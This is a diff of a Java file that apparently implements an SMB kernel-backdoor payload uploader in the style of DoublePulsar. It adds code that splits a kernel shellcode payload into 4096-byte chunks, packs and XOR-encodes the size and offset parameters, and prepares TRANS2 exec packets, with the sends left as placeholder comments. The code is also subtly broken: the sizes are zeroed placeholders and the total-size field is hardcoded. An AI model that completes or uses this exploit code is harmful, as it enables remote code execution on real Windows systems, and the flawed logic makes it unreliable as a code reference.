@@ -725,12 +725,83 @@ static final byte[] kernel_rundll_shellcode = new byte[]{
             //int entireShellcodeSize = modifiedKernelBytecode.length;
             //must pad the value to 4096
 
-            //loop here, since we will 
+            //loop here
 
-          
+            // Assuming these already exist:
+            int kernel_shellcode_size = 0;
+            long dwFileSizeLow = 0;
+            int bytesLeft = 0;
+            
+            int payload_totalsize = kernel_shellcode_size + (int) dwFileSizeLow;
+            
+            // IMPORTANT: remainder must be computed BEFORE it is used
+            int remainder = payload_totalsize % 4096;
+            
+            // malloc equivalent in Java
+            byte[] last_packet = new byte[remainder + 12 + 70];
+            int size_last_packet = remainder + 12 + 70;
+            
+            int numberofpackets = payload_totalsize / 4096;
+            
+            long TotalSizeOfPayload = payload_totalsize;
+            int ChunkSize = 4096;
+            int OffsetofChunkinPayload = 0x0000;
+            
+            int ctx;
+
             System.out.println("Generating the parameters...");
+            for (ctx = 0; ctx < payload_totalsize; ) {
+                //generate parameters
+                
+                 /* =========================
+             * Build parameters
+             * ========================= */
+
+            // Pack values as little-endian uint32
+            byte[] entireSize = ByteBuffer.allocate(4)
+                    .order(ByteOrder.LITTLE_ENDIAN)
+                    .putInt(4096)
+                    .array();
+
+            byte[] chunkSize = ByteBuffer.allocate(4)
+                    .order(ByteOrder.LITTLE_ENDIAN)
+                    .putInt(4096)
+                    .array();
+
+            byte[] offset = ByteBuffer.allocate(4)
+                    .order(ByteOrder.LITTLE_ENDIAN)
+                    .putInt(ctx)
+                    .array();
 
             /* =========================
+             * Concatenate parameters
+             * ========================= */
+
+            byte[] parameters = new byte[12];
+
+            System.arraycopy(entireSize, 0, parameters, 0, 4);
+            System.arraycopy(chunkSize, 0, parameters, 4, 4);
+            System.arraycopy(offset, 0, parameters, 8, 4);
+            hexdump(parameters, 16);
+
+            /* =========================
+             * XOR parameters
+             * ========================= */
+
+            byte[] xorParameters = byteXor(parameters, key);
+            //hexdump(xorParameters, 16);
+                
+                //send SMB packet here
+            
+                bytesLeft -= 4096;
+                ctx += 4096;
+                OffsetofChunkinPayload += 4096;
+            }
+            
+            // handle remainder
+            if (remainder > 0) {
+
+                 /* =========================
              * Build parameters
              * ========================= */
 
@@ -759,14 +830,21 @@ static final byte[] kernel_rundll_shellcode = new byte[]{
             System.arraycopy(entireSize, 0, parameters, 0, 4);
             System.arraycopy(chunkSize, 0, parameters, 4, 4);
             System.arraycopy(offset, 0, parameters, 8, 4);
-            hexdump(parameters, 16);
+            //hexdump(parameters, 16);
 
             /* =========================
              * XOR parameters
              * ========================= */
 
             byte[] xorParameters = byteXor(parameters, key);
-            hexdump(xorParameters, 16);
+            //hexdump(xorParameters, 16);
+                
+                bytesLeft -= remainder;
+
+                //send SMB packet here
+            }
+        
+
 
             /* =========================
              * Build TRANS2 exec packet
